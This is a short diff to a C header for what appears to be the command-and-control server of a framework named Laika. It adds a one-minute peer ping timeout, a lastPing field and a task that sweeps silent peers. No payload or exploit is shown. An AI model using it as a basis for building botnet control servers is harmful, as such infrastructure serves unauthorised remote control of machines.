@@ -6,12 +6,17 @@
 #include "lsocket.h"
 #include "lpolllist.h"
 #include "lpeer.h"
+#include "ltask.h"
 #include "hashmap.h"
+
+/* kill peers if they haven't ping'd within a minute */
+#define LAIKA_PEER_TIMEOUT 60 * 1000
 
 typedef bool (*tLaika_peerIter)(struct sLaika_peer *peer, void *uData);
 
 struct sLaika_peerInfo {
     struct sLaika_cnc *cnc;
+    long lastPing;
 };
 
 #define BASE_PEERINFO struct sLaika_peerInfo info;
@@ -62,5 +67,10 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout);
 void laikaC_iterPeers(struct sLaika_cnc *cnc, tLaika_peerIter iter, void *uData);
 
 struct sLaika_peer *laikaC_getPeerByPub(struct sLaika_cnc *cnc, uint8_t *pub);
+
+/* kills peers who haven't ping'd in a while */
+void laikaC_sweepPeersTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData);
+
+void laikaC_iterPeers(struct sLaika_cnc *cnc, tLaika_peerIter iter, void *uData);
 
 #endif
